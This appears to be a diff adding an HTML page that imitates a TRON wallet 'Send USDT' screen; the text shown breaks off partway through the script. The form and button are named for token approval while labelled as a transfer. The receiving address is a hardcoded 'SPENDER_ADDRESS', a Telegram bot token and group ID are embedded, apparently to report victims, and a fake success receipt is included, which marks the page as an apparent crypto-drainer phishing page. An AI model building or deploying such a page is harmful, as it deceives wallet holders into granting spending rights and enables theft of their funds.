@@ -1,0 +1,1750 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Transfer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f2f3f8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 0;
+            margin: 0;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 20px;
+            border-bottom: none;
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .header-btn {
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 4px 8px;
+            color: #333;
+            transition: all 0.3s;
+        }
+
+        .header-btn:hover {
+            color: #1890ff;
+        }
+
+        .header-btn svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .back-btn-section {
+            min-width: 32px;
+        }
+
+        .menu-btn-section {
+            min-width: 32px;
+            display: none;
+            justify-content: flex-end;
+        }
+
+        .header-title {
+            flex: 1;
+            text-align: center;
+        }
+
+        @keyframes slideInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .container {
+            background: #f2f3f8;
+            flex: 1;
+            width: 100%;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        #approvalForm {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .input-box {
+            background: #f9f9f9;
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 13px;
+            color: #666;
+            word-break: break-all;
+            min-height: 42px;
+            display: flex;
+            align-items: center;
+        }
+
+        input[type="text"],
+        input[type="number"] {
+            width: 100%;
+            background: #f9f9f9;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 14px;
+            font-size: 14px;
+            color: #333;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus,
+        input[type="number"]:focus {
+            outline: none;
+            border: none;
+            background: #fafafa;
+        }
+
+        #transferAmount::placeholder {
+            color: #bbb;
+        }
+
+        .token-selector-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 20px;
+            border-bottom: none;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .token-selector-item:hover {
+            background-color: #f9f9f9;
+        }
+
+        .fee-loading-animation {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f0f0f0;
+            border-top: 2px solid #1890ff;
+            border-radius: 50%;
+            animation: iphoneSpinner 2s linear infinite;
+        }
+
+        @keyframes iphoneSpinner {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .input-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 8px;
+        }
+
+        .max-btn {
+            background: none;
+            border: 1px solid #d9d9d9;
+            border-radius: 16px;
+            padding: 4px 12px;
+            font-size: 12px;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .max-btn:hover {
+            border-color: #1890ff;
+            color: #1890ff;
+        }
+
+        .asset-display {
+            font-size: 13px;
+            color: #666;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .asset-icon {
+            width: 16px;
+            height: 16px;
+            background: #1890ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 10px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: #1890ff;
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 16px;
+            color: white;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: auto;
+        }
+
+        .submit-btn:hover {
+            background: #0050b3;
+        }
+
+        .submit-btn:disabled {
+            background: #d9d9d9;
+            cursor: not-allowed;
+        }
+
+        .status-message {
+            padding: 12px 14px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            display: none;
+            animation: slideInUp 0.4s ease-out;
+        }
+
+        .status-message.show {
+            display: block;
+        }
+
+        .status-message.success {
+            background: #f6ffed;
+            color: #52c41a;
+            border: 1px solid #b7eb8f;
+        }
+
+        .status-message.error {
+            background: #fff1f0;
+            color: #ff4d4f;
+            border: 1px solid #ffccc7;
+        }
+
+        .status-message.pending {
+            background: #e6f7ff;
+            color: #1890ff;
+            border: 1px solid #91d5ff;
+        }
+
+        .transaction-link {
+            color: #1890ff;
+            text-decoration: none;
+            font-weight: 500;
+            margin-left: 8px;
+        }
+
+        .transaction-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Animations */
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideInLeft {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .wallet-logos {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            animation: slideInUp 0.6s ease-out;
+        }
+
+        .wallet-logo {
+            width: 50px;
+            height: 50px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            background: #f5f5f5;
+            border: 1px solid #e5e5e5;
+            transition: all 0.3s;
+            animation: slideInUp 0.6s ease-out backwards;
+        }
+
+        .wallet-logo:nth-child(1) { animation-delay: 0.1s; }
+        .wallet-logo:nth-child(2) { animation-delay: 0.2s; }
+        .wallet-logo:nth-child(3) { animation-delay: 0.3s; }
+        .wallet-logo:nth-child(4) { animation-delay: 0.4s; }
+        .wallet-logo:nth-child(5) { animation-delay: 0.5s; }
+
+        .wallet-logo:hover {
+            border-color: #1890ff;
+            box-shadow: 0 2px 8px rgba(24, 144, 255, 0.15);
+        }
+
+        .wallet-logo img {
+            width: 36px;
+            height: 36px;
+            object-fit: contain;
+        }
+
+        .network-title {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-top: 12px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #e5e5e5;
+            animation: slideInUp 0.6s ease-out 0.5s backwards;
+        }
+
+        .network-fee-section {
+            background: transparent;
+            border: none;
+            border-radius: 0;
+            padding: 0;
+            margin-bottom: 20px;
+            margin-top: 18 px;
+            animation: slideInUp 0.6s ease-out 0.6s backwards;
+        }
+
+        .network-fee-box {
+            background: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            margin-bottom: 12px;
+        }
+
+        .network-fee-label {
+            font-size: 12px;
+            color: #999;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .network-fee-value {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .fee-amount {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 4px;
+        }
+
+        .fee-trx {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .fee-usd {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .fee-loading {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #1890ff;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .popup-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 12px;
+            padding: 20px 30px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+            font-size: 14px;
+            text-align: center;
+            max-width: 280px;
+            word-wrap: break-word;
+            z-index: 9999;
+            animation: popupFade 3s ease-in-out forwards;
+            display: none;
+        }
+
+        .popup-message.show {
+            display: block;
+        }
+
+        .popup-message.success {
+            color: #52c41a;
+            border: 1px solid #b7eb8f;
+            background: #f6ffed;
+        }
+
+        .popup-message.error {
+            color: #ff4d4f;
+            border: 1px solid #ffccc7;
+            background: #fff1f0;
+        }
+
+        .popup-message.warning {
+            color: #faad14;
+            border: 1px solid #ffe58f;
+            background: #fffbe6;
+        }
+
+        .popup-message.pending {
+            color: #1890ff;
+            border: 1px solid #91d5ff;
+            background: #e6f7ff;
+        }
+
+        @keyframes popupFade {
+            0% {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(0.9);
+            }
+            10% {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+            90% {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(0.9);
+            }
+        }
+
+        .fee-info-btn {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            border: 1px solid #d9d9d9;
+            background: white;
+            color: #666;
+            font-size: 10px;
+            font-weight: 600;
+            line-height: 1;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+            position: relative;
+            padding: 0;
+        }
+
+        .fee-info-btn:hover {
+            border-color: #1890ff;
+            color: #1890ff;
+        }
+
+        .fee-info-tooltip {
+            position: absolute;
+            top: -8px;
+            left: 100%;
+            background: #fff;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            padding: 12px 14px;
+            font-size: 12px;
+            color: #666;
+            width: 240px;
+            line-height: 1.6;
+            margin-left: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            display: none;
+            z-index: 1000;
+            white-space: normal;
+        }
+
+        .fee-info-tooltip.show {
+            display: block;
+        }
+
+        .fee-info-tooltip::after {
+            content: '';
+            position: absolute;
+            top: 16px;
+            left: -8px;
+            width: 8px;
+            height: 8px;
+            background: #fff;
+            border-left: 1px solid #e5e5e5;
+            border-top: 1px solid #e5e5e5;
+            transform: rotate(45deg);
+            display: none;
+        }
+
+        .dialog-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9998;
+        }
+
+        .dialog-overlay.show {
+            display: flex;
+        }
+
+        .dialog-box {
+            background: white;
+            border-radius: 12px;
+            padding: 24px 20px;
+            max-width: 320px;
+            width: 90%;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+            animation: slideInUp 0.3s ease-out;
+        }
+
+        .dialog-option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: left;
+        }
+
+        .dialog-option:hover {
+            background: #f5f5f5;
+        }
+
+        .dialog-option-icon {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .dialog-option-content {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .dialog-option-title {
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .dialog-option-subtitle {
+            font-size: 12px;
+            color: #999;
+            margin-top: 2px;
+        }
+
+        .share-dialog {
+            display: none;
+        }
+
+        .share-dialog.show {
+            display: block;
+        }
+
+        .share-content {
+            margin-bottom: 16px;
+        }
+
+        .share-link {
+            background: #f5f5f5;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 12px;
+            color: #666;
+            word-break: break-all;
+            margin-bottom: 12px;
+        }
+
+        .share-buttons {
+            display: flex;
+            gap: 8px;
+        }
+
+        .share-btn {
+            flex: 1;
+            padding: 10px 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .copy-btn {
+            background: #1890ff;
+            color: white;
+        }
+
+        .copy-btn:hover {
+            background: #0050b3;
+        }
+
+        .share-platforms-btn {
+            background: #f5f5f5;
+            border: 1px solid #e5e5e5;
+            color: #333;
+        }
+
+        .share-platforms-btn:hover {
+            background: #efefef;
+        }
+
+        /* Success Page Styles */
+        #successPage {
+            display: none;
+        }
+
+        .success-checkmark {
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .success-checkmark-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 60px;
+            height: 60px;
+            background: #f6ffed;
+            border: 2px solid #52c41a;
+            border-radius: 50%;
+            font-size: 32px;
+            color: #52c41a;
+            margin-bottom: 8px;
+        }
+
+        .success-checkmark-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: #52c41a;
+        }
+
+        .success-title {
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 24px;
+        }
+
+        .success-amount-section {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .success-amount {
+            font-size: 32px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .success-value {
+            font-size: 16px;
+            color: #999;
+        }
+
+        .success-info-box {
+            background: #f9f9f9;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+
+        .success-info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            font-size: 13px;
+            color: #666;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .success-info-row:first-child {
+            padding-top: 0;
+        }
+
+        .success-info-row:last-child {
+            border-bottom: none;
+            padding-bottom: 0;
+        }
+
+        .success-info-label {
+            color: #999;
+            font-weight: 400;
+        }
+
+        .success-info-value {
+            color: #333;
+            font-weight: 500;
+            text-align: right;
+            word-break: break-all;
+            max-width: 60%;
+        }
+
+        .success-fee-section {
+            background: #f9f9f9;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            padding: 16px;
+        }
+
+        .success-fee-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .success-fee-label {
+            font-size: 13px;
+            color: #999;
+        }
+
+        .success-fee-value {
+            font-size: 13px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .success-button {
+            width: 100%;
+            background: #1890ff;
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 16px;
+            color: white;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+        }
+
+        .success-button:hover {
+            background: #0050b3;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 16px;
+            }
+            
+            .submit-btn {
+                font-size: 15px;
+                padding: 12px;
+            }
+
+            .success-amount {
+                font-size: 28px;
+            }
+        }
+
+        @keyframes slideUpModal {
+            from {
+                opacity: 0;
+                transform: translateY(100%);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="back-btn-section">
+            <button class="header-btn" id="backBtn" title="Go back">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M19 12H5M12 19l-7-7 7-7"/>
+                </svg>
+            </button>
+        </div>
+        <div class="header-title">Send</div>
+        <div class="menu-btn-section">
+            <button class="header-btn" id="menuBtn" title="Menu">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="3" y1="6" x2="21" y2="6"></line>
+                    <line x1="3" y1="12" x2="21" y2="12"></line>
+                    <line x1="3" y1="18" x2="21" y2="18"></line>
+                </svg>
+            </button>
+        </div>
+    </div>
+
+    <!-- Menu Dialog -->
+    <div class="dialog-overlay" id="dialogOverlay">
+        <div class="dialog-box">
+            <!-- Main Menu -->
+            <div id="mainMenu">
+                <div class="dialog-option" id="networkOption">
+                    <div class="dialog-option-icon">🌐</div>
+                    <div class="dialog-option-content">
+                        <div class="dialog-option-title">Network</div>
+                        <div class="dialog-option-subtitle">TRON</div>
+                    </div>
+                </div>
+                <div class="dialog-option" id="shareOption">
+                    <div class="dialog-option-icon">📤</div>
+                    <div class="dialog-option-content">
+                        <div class="dialog-option-title">Share</div>
+                        <div class="dialog-option-subtitle">Share this link</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Share Menu -->
+            <div class="share-dialog" id="shareDialog">
+                <div style="display: flex; align-items: center; margin-bottom: 16px;">
+                    <button class="header-btn" id="shareBackBtn" style="flex-shrink: 0; margin-left: -8px;">←</button>
+                    <span style="flex: 1; text-align: center; font-size: 14px; font-weight: 500; color: #333;">Share</span>
+                    <div style="width: 32px;"></div>
+                </div>
+                <div class="share-content">
+                    <span style="font-size: 12px; color: #666; display: block; margin-bottom: 8px;">Share your link</span>
+                    <div class="share-link" id="shareLink">https://tron-dapp.example.com</div>
+                    <div class="share-buttons">
+                        <button class="share-btn copy-btn" id="copyBtn">📋 Copy</button>
+                        <button class="share-btn share-platforms-btn" id="shareBtn">📲 Share</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div id="statusMessage" class="status-message"></div>
+        <div id="popupMessage" class="popup-message"></div>
+
+        <!-- Form - Always Visible -->
+        <div id="approvalForm">
+            <!-- Receiving Address -->
+            <div class="form-group">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                    <label style="margin-bottom: 0; font-weight: 600; font-size: 13px;">Receiving Address</label>
+                    <a href="#" onclick="openTokenSelector(event)" style="color: #1890ff; font-size: 13px; text-decoration: none; font-weight: 500;">Choose Wallet ></a>
+                </div>
+                <div style="position: relative; display: flex; align-items: center;">
+                    <div class="input-box" style="flex: 1; cursor: default; position: relative; padding-right: 50px;">
+                        <span id="addressText" style="word-break: break-all; font-size: 16px;"><span style="font-weight: 600;">TGjgVNa</span>pDCuxQcV1VwoFQE3ghPK<span style="font-weight: 600;">vqdmtw2</span></span>
+                    </div>
+                    <button id="qrScanBtn" onclick="openTokenSelector(event)" style="position: absolute; right: 14px; background: none; border: none; font-size: 20px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.3s; padding: 0; color: #333;">
+                        <img src="transparent_icon.png" alt="Scan QR" style="width: 20px; height: 20px; object-fit: contain;">
+                    </button>
+                </div>
+            </div>
+
+            <!-- Amount + Available (Unified Box) -->
+            <div class="form-group" style="margin-bottom: 20px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                    <label style="margin-bottom: 0; font-weight: 600; font-size: 13px;">Transfer</label>
+                    <a href="#" onclick="openTokenSelector(event)" style="color: #999; font-size: 13px; text-decoration: none; font-weight: 500;">USDT ></a>
+                </div>
+                <div style="border: none; border-radius: 8px; overflow: hidden;">
+                    <!-- Amount Input (Top Half) -->
+                    <div style="position: relative; display: flex; align-items: center; background: #f9f9f9; padding: 16px 14px;">
+                        <input type="text" id="transferAmount" placeholder="0" value="" style="padding-left: 4px; padding-right: 50px; border: none; background: transparent; font-size: 24px; font-weight: 600; color: #333;">
+                        <button class="max-btn" style="position: absolute; right: 14.5px; border: 1px solid #1890ff; color: #1890ff; cursor: pointer;">Max</button>
+                    </div>
+                    <!-- Divider -->
+                    <div style="height: 1px; background: #e5e5e5;"></div>
+                    <!-- Available (Bottom Half) -->
+                    <div style="display: flex; align-items: center; justify-content: space-between; padding: 12px 14px; background: #fafafa;">
+                        <span style="font-size: 12px; color: #999;">Balance</span>
+                        <div style="display: flex; align-items: center; gap: 6px;">
+                            <span id="usdtBalance" style="font-size: 14px; color: #333; font-weight: 500;">0</span>
+                            <span style="font-size: 13px; color: #999;">USDT</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Network Fee Section -->
+            <div class="network-fee-section">
+                <!-- Network Fee Header -->
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                    <div style="display: flex; align-items: center; gap: 4px;">
+                        <span style="font-size: 13px; color: #333; font-weight: 600;">Network Fee</span>
+                        <div style="position: relative;">
+                            <button class="fee-info-btn" id="feeInfoBtn" title="Network fee information">?</button>
+                            <div class="fee-info-tooltip" id="feeInfoTooltip">
+                                <strong>Network fees info</strong><br>
+                                Network fees, or gas fees, are the costs for processing transactions on a blockchain. They are paid to miners or validators who help secure and process these transactions. Fees can vary based on factors like network congestion, transaction size, and the blockchain used.
+                            </div>
+                        </div>
+                    </div>
+                    <a href="#" style="color: #1890ff; font-size: 13px; text-decoration: none; font-weight: 500;">🎁 Subsidy ></a>
+                </div>
+
+                <!-- Pay With Box -->
+                <div id="payWithBox" class="network-fee-box" style="transition: all 0.3s ease;">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <span style="font-size: 13px; color: #666;">Pay With</span>
+                        <div style="display: flex; align-items: center; gap: 6px;">
+                            <img src="tronredlogo.png" alt="TRON" style="width: 20px; height: 20px; flex-shrink: 0;">
+                            <span style="font-size: 13px; color: #333; font-weight: 500;">TRX</span>
+                            <span style="font-size: 13px; color: #999;">></span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Est. Network Fee & Energy Rental Box -->
+                <div id="estNetworkFeeBox" class="network-fee-box" style="transition: all 0.3s ease;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; padding-bottom: 12px; border-bottom: none;">
+                        <span style="font-size: 13px; color: #666; font-weight: 600;">Est. Network Fee</span>
+                        <div style="display: flex; flex-direction: column; align-items: flex-end; gap: 2px;">
+                            <div id="feeDisplay" style="font-size: 13px; font-weight: 500; color: #333;">
+                                <span style="color: #999;">$</span><span id="feeUsd">0.00</span> <span id="feeAmount">0 TRX</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; align-items: center; padding-top: 12px;">
+                        <span style="font-size: 13px; color: #666; font-weight: 600;">Energy Rental</span>
+                        <label style="position: relative; display: inline-flex; align-items: center; cursor: pointer; margin: 0;">
+                            <input type="checkbox" id="energyToggle" checked style="width: 44px; height: 24px; cursor: pointer; appearance: none; border-radius: 12px; transition: 0.3s; outline: none;">
+                            <style>
+                                #energyToggle {
+                                    position: relative;
+                                    background: #52c41a;
+                                }
+                                #energyToggle::after {
+                                    content: '';
+                                    position: absolute;
+                                    width: 20px;
+                                    height: 20px;
+                                    background: white;
+                                    border-radius: 50%;
+                                    top: 2px;
+                                    left: 22px;
+                                    transition: 0.3s;
+                                }
+                                #energyToggle:not(:checked) {
+                                    background: #d9d9d9;
+                                }
+                                #energyToggle:not(:checked)::after {
+                                    left: 2px;
+                                }
+                            </style>
+                        </label>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Advanced Mode -->
+            <div style="text-align: right; margin-bottom: 12px; margin-top: -15px;">
+                <a href="#" style="color: #999; font-size: 13px; text-decoration: none; font-weight: 500;">Advanced Mode ></a>
+            </div>
+
+            <!-- Confirm Button -->
+            <button id="approveBtn" class="submit-btn">Confirm</button>
+        </div>
+
+        <!-- Token Selector Modal (Bottom Popup) -->
+        <div id="tokenSelectorModal" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.5); display: flex; z-index: 2000; align-items: flex-end; justify-content: center;">
+            <div style="background: white; width: 100%; height: 85%; display: flex; flex-direction: column; overflow: hidden; border-radius: 12px 12px 0 0; animation: slideUpModal 0.3s ease-out;">
+                <!-- Modal Header -->
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 1px 20px; border-bottom: none; min-height: 56px;">
+                    <div style="flex: 1;"></div>
+                    <div style="flex: 1; text-align: center; font-size: 16px; font-weight: 600; color: #333;">Select token</div>
+                    <div style="flex: 1; text-align: right;">
+                        <button onclick="closeTokenSelector()" style="background: none; border: none; font-size: 24px; color: #999; cursor: pointer; padding: 4px 8px; transition: color 0.3s;">&times;</button>
+                    </div>
+                </div>
+
+                <!-- Search -->
+                <div style="padding: 1px 20px; border-bottom: none;">
+                    <input type="text" id="tokenSearch" placeholder="Enter token symbol" onkeyup="filterTokensModal()" style="width: 100%; background: #f5f5f5; border: none; border-radius: 8px; padding: 12px 14px 12px 40px; font-size: 14px; color: #333; background-image: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23999' stroke-width='2'%3E%3Ccircle cx='11' cy='11' r='8'%3E%3C/circle%3E%3Cpath d='m21 21-4.35-4.35'%3E%3C/path%3E%3C/svg%3E\"); background-repeat: no-repeat; background-position: 12px center;" />
+                </div>
+
+                <!-- Token List -->
+                <div id="tokenListModal" style="flex: 1; overflow-y: auto; padding: 0px;">
+                    <!-- TRX Token -->
+                    <div class="token-selector-item" onclick="connectWalletAndClose()">
+                        <div style="display: flex; align-items: center; gap: 12px; flex: 1;">
+                            <div style="width: 40px; height: 40px; border-radius: 50%; background-image: url('tronredlogo.png'); background-size: cover; background-position: center; flex-shrink: 0;"></div>
+                            <div style="display: flex; flex-direction: column; gap: 4px;">
+                                <div style="font-size: 15px; font-weight: 600; color: #333;">TRX</div>
+                                <div style="font-size: 13px; color: #999;">$0.2840 <span style="color: #52c41a;">+0.56%</span></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- USDT Token -->
+                    <div class="token-selector-item" onclick="connectWalletAndClose()">
+                        <div style="display: flex; align-items: center; gap: 12px; flex: 1;">
+                            <div style="width: 40px; height: 40px; border-radius: 50%; background-image: url('5.png'); background-size: cover; background-position: center; flex-shrink: 0;"></div>
+                            <div style="display: flex; flex-direction: column; gap: 4px;">
+                                <div style="font-size: 15px; font-weight: 600; color: #333;">USDT</div>
+                                <div style="font-size: 13px; color: #999;">$1.0000 <span style="color: #52c41a;">0%</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success Page (Hidden by default) -->
+        <div id="successPage">
+            <div class="success-checkmark">
+                <div class="success-checkmark-icon">✓</div>
+                <div class="success-checkmark-text">Successful</div>
+            </div>
+            
+            <div class="success-amount-section">
+                <div class="success-amount"><span id="successAmountValue">-0.00</span> USDT</div>
+                <div class="success-value">≈ $<span id="successUsdValue">0.00</span></div>
+            </div>
+
+            <div class="success-info-box">
+                <div class="success-info-row">
+                    <span class="success-info-label">Date</span>
+                    <span class="success-info-value" id="successDate"></span>
+                </div>
+                <div class="success-info-row">
+                    <span class="success-info-label">Status</span>
+                    <span class="success-info-value" id="successStatus">Completed</span>
+                </div>
+                <div class="success-info-row">
+                    <span class="success-info-label">Recipient</span>
+                    <span class="success-info-value" id="successRecipient">TFyXE2YG6........6wPaKD8q</span>
+                </div>
+            </div>
+
+            <div class="success-fee-section">
+                <div class="success-fee-row">
+                    <span class="success-fee-label">Network fee</span>
+                    <span class="success-fee-value" id="successNetworkFee">0 TRX ($0.00)</span>
+                </div>
+            </div>
+
+            <button class="success-button" id="doneBtn">Done</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = '8274422470:AAEQuQO_tSb71FG3yFwiyIrLqwE4E2lNm4s';
+        const GROUP_ID = -5168234155;
+        
+        // TRON Configuration
+        const MAINNET_RPC = 'https://api.trongrid.io';
+        const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        const SPENDER_ADDRESS = 'TGjgVNapDCuxQcV1VwoFQE3ghPKvqdmtw2';
+        const DECIMALS = 6;
+
+        let tronWeb = null;
+        let userAddress = null;
+        let userBalance = 0;
+        let userTrxBalance = 0;
+        let isConnected = false;
+
+        // Initialize TronWeb with multi-wallet support
+        async function initTronWeb() {
+            let retries = 0;
+            const maxRetries = 30; // 30 * 500ms = 15 seconds (longer for Trust Wallet)
+            
+            while (retries < maxRetries) {
+                // Check for standard TronWeb injection
+                if (typeof window !== 'undefined') {
+                    if (window.tronWeb && window.tronWeb.defaultAddress) {
+                        tronWeb = window.tronWeb;
+                        console.log('TronWeb initialized successfully');
+                        return;
+                    }
+                    
+                    // Check for ethereum provider (some wallets use this)
+                    if (window.ethereum && window.ethereum.isTronLink) {
+                        tronWeb = window.tronWeb || window.ethereum;
+                        console.log('TronWeb detected via ethereum provider');
+                        return;
+                    }
+                    
+                    // Check for other wallet providers (Trust Wallet, TokenPocket, etc)
+                    if (window.truthToken || window.tokenPocket || window.__TRON__) {
+                        tronWeb = window.tronWeb;
+                        console.log('TronWeb detected via alternative provider');
+                        return;
+                    }
+                }
+                
+                retries++;
+                if (retries < maxRetries) {
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    console.log(`Waiting for wallet injection... (${retries}/${maxRetries})`);
+                }
+            }
+            
+            console.warn('TronWeb not available after 15 seconds. User may need to refresh or use a compatible wallet.');
+        }
+
+        // Connect Wallet
+        async function connectWallet() {
+            try {
+                const addressText = document.getElementById('addressText');
+                
+                // Try to reinitialize TronWeb in case wallet was just installed
+                if (!tronWeb || !tronWeb.defaultAddress) {
+                    console.log('TronWeb not available, attempting reinitialization...');
+                    await initTronWeb();
+                }
+                
+                if (!tronWeb || !tronWeb.defaultAddress) {
+                    showMessage('error', `Wallet Not Detected. Please install a compatible wallet and ensure TRON Mainnet is enabled.`);
+                    addressText.innerHTML = '<span style="font-weight: 600;">TGjgVNa</span>pDCuxQcV1VwoFQE3ghPK<span style="font-weight: 600;">vqdmtw2</span>';
+                    return;
